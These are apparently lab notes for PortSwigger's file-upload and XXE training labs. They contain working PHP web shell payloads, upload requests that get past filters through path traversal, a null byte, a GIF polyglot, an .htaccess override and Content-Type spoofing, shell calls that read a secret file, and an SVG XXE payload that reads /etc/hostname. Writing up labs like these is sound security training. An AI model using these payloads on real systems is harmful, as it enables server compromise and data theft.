## Approach

1. If there's file upload test it by the following
	- Upload a shell
	- Bypass with path traversal
	- Polyglot bypass
	- Custom extension `.php5` and `.htaccess` override
	- `Content-Type` bypass
	- XXE via SVG
## Labs
### [1. Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

> [!NOTE] 
> Web shell upload possible via path traversal URL encoded

**Web shell upload with path traversal**

> Uploaded web shell with a URL encoded path traversal
```php
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fshell2.php"
Content-Type: image/jpeg

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php echo system($_GET['command']); ?>
```

**Calling the shell**

> Getting `/home/carlos/secret`
```
/files/shell2.php?cmd=cat%20/home/carlos/secret
```

### [2. Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

> [!NOTE] 
> Web shell upload via obfuscating file extension with null byte

**Web shell upload**

> Web shell upload with file extension bypass by providing null byte
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php echo system($_GET['command']); ?>
```

**Calling the web shell**

> Getting `/home/carlos/secret`
```
/files/avatars/shell.php?cmd=cat%20/home/carlos/secret
```

### [3. Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

> [!NOTE] 
> Web shell upload with polyglot bypass by embedding the web shell inside a supposedly image file 

**Web shell upload**

> Web shell upload with polyglot GIF
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

GIF89a <?php system($_GET["cmd"]); ?>
```

**Calling web shell**

> Getting `/home/carlos/secret`
```
/files/avatars/shell.php?cmd=cat%20/home/carlos/secret
```

### [4. Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

> [!NOTE] 
> Web shell upload possible using custom file extension that is assigned PHP execution with `.htaccess` override

**`.htaccess` upload**

> Uploading `.htaccess` file is for telling the server some custom file extension that executes will execute as a PHP
```php
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/jpeg

AddHandler application/x-httpd-php .php .phtml .php5
```

**Web shell upload**

> Uploading web shell with custom file extension `.php5` bypass
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php5"
Content-Type: image/jpeg

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php echo system($_GET['command']); ?>
```

**Calling the shell**

> Getting `/home/carlos/secret`
```
/files/avatars/shell.php5?cmd=cat%20/home/carlos/secret
```

### [5. Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

> [!NOTE] 
> The server check `Content-Type` but it doesn't check the contents allowing upload of web shell

**Web shell upload**

> `Content-Type: image/jpeg` bypass
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php echo system($_GET['command']); ?>

```

### [6. Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

> [!NOTE]
> File upload XXE to exfiltrate `/etc/hostname` via SVG 

**Uploading XXE**

> Upload the file as SVG containing XXE
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

**Extracting data**

> Uploaded XXE `.svg` executes the command to get the hostname
![](attachments/Pasted%20image%2020260108081207.png)
